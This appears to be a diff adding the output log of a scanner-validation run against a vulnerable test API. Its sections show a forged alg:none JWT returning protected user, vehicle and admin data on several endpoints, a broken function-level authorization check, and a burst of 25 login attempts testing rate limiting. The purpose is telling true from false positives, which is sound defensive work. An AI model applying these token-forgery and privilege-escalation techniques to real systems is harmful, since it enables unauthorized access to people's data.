@@ -1,0 +1,83 @@
+=== 0. Get a REAL regular-user token (User A) ===
+User A token (first 30): eyJhbGciOiJSUzI1NiJ9.eyJzdWIiO...
+
+=== 1. Forge an alg:none token from User A's token (the JWT check's attack) ===
+forged alg:none token: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0....
+
+############ JWT alg:none — THE KEY TEST ############
+For EACH endpoint: does the forged token return the REAL protected data,
+or a 200 with an error/empty body? Real data = TRUE POSITIVE. Error body = FALSE POSITIVE.
+
+---- /identity/api/v2/user/dashboard ----
+[forged alg:none]
+HTTP/1.1 200 
+{"id":8,"name":"UserA","email":"usera@test.com","number":"9797877689","picture_url":null,"video_url":null,"video_name":null,"available_credit":175.0,"video_id":0,"role":"ROLE_USER"}
+[NO token, for comparison]
+HTTP/1.1 404 
+  -> If forged shows real data but no-token is 401/403, it's a REAL bypass (TP).
+  -> If forged is 200 but body is an error/empty, it's a FALSE POSITIVE.
+
+---- /identity/api/v2/vehicle/vehicles ----
+[forged alg:none]
+HTTP/1.1 200 
+[{"id":6,"uuid":"91a9d218-eb04-4728-9b95-2929d187fcc7","pincode":"3676","vin":"4SGPE2EKC950BYM4M","year":2026,"status":"INACTIVE","previousOwners":[],"model":{"id":5,"model":"RS7","fuel_type":"PETROL","vehicle_img":"images/audi-rs7.jpg","vehiclecompany":{"id":5,"name":"Audi"}},"vehicleLocation":{"id
+[NO token, for comparison]
+HTTP/1.1 401 
+  -> If forged shows real data but no-token is 401/403, it's a REAL bypass (TP).
+  -> If forged is 200 but body is an error/empty, it's a FALSE POSITIVE.
+
+---- /community/api/v2/community/posts/recent ----
+[forged alg:none]
+HTTP/1.1 200 OK
+{"posts":[{"id":"qutfe7vnDj6AP8rKrde3Ta","title":"{{$randomLoremSentence}}","content":"{{$randomLoremParagraph}}","author":{"nickname":"UserA","email":"usera@test.com","vehicleid":"91a9d218-eb04-4728-9b95-2929d187fcc7","profile_pic_url":"","created_at":"2026-07-22T12:02:42.834Z"},"comments":[],"auth
+[NO token, for comparison]
+HTTP/1.1 401 Unauthorized
+  -> If forged shows real data but no-token is 401/403, it's a REAL bypass (TP).
+  -> If forged is 200 but body is an error/empty, it's a FALSE POSITIVE.
+
+---- /workshop/api/mechanic/service_requests ----
+[forged alg:none]
+HTTP/1.1 200 OK
+{"service_requests":[],"next_offset":null,"previous_offset":null,"count":0}
+[NO token, for comparison]
+HTTP/1.1 401 Unauthorized
+  -> If forged shows real data but no-token is 401/403, it's a REAL bypass (TP).
+  -> If forged is 200 but body is an error/empty, it's a FALSE POSITIVE.
+
+---- /workshop/api/shop/products ----
+[forged alg:none]
+HTTP/1.1 200 OK
+{"products":[{"id":42,"name":"NewSeat","price":"100.00","image_url":"images/seat.svg"},{"id":41,"name":"NewSeat","price":"100.00","image_url":"images/seat.svg"},{"id":40,"name":"NewSeat","price":"100.00","image_url":"images/seat.svg"},{"id":39,"name":"NewSeat","price":"100.00","image_url":"images/se
+[NO token, for comparison]
+HTTP/1.1 401 Unauthorized
+  -> If forged shows real data but no-token is 401/403, it's a REAL bypass (TP).
+  -> If forged is 200 but body is an error/empty, it's a FALSE POSITIVE.
+
+---- /workshop/api/shop/orders/all ----
+[forged alg:none]
+HTTP/1.1 200 OK
+{"orders":[],"next_offset":null,"previous_offset":null,"count":0}
+[NO token, for comparison]
+HTTP/1.1 401 Unauthorized
+  -> If forged shows real data but no-token is 401/403, it's a REAL bypass (TP).
+  -> If forged is 200 but body is an error/empty, it's a FALSE POSITIVE.
+
+---- /workshop/api/management/users/all ----
+[forged alg:none]
+HTTP/1.1 200 OK
+{"users":[{"user":{"email":"adam007@example.com","number":"9876895423"},"available_credit":100.0},{"user":{"email":"pogba006@example.com","number":"9876570006"},"available_credit":100.0},{"user":{"email":"robot001@example.com","number":"9876570001"},"available_credit":100.0},{"user":{"email":"test@e
+[NO token, for comparison]
+HTTP/1.1 401 Unauthorized
+  -> If forged shows real data but no-token is 401/403, it's a REAL bypass (TP).
+  -> If forged is 200 but body is an error/empty, it's a FALSE POSITIVE.
+
+############ BFLA / Priv-esc — /workshop/api/management/users/all ############
+Does a REGULAR user (real token) get the admin user list back?
+HTTP/1.1 200 OK
+{"users":[{"user":{"email":"adam007@example.com","number":"9876895423"},"available_credit":100.0},{"user":{"email":"pogba006@example.com","number":"9876570006"},"available_credit":100.0},{"user":{"email":"robot001@example.com","number":"9876570001"},"available_credit":100.0},{"user":{"email":"test@example.com","number":"9876540001"},"available_credit":100.0},{"user":{"email":"admin@example.com","n
+  -> Real user list = TP. 403/empty/error = FP.
+
+############ Rate limiting — send 25 rapid logins, count 429s ############
+status codes:  401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401
+  -> Any 429 = the app DOES throttle (your check may be a FP or threshold too low).
+  -> All 200/4xx-non-429 = no throttling (TP). Decide your real threshold.
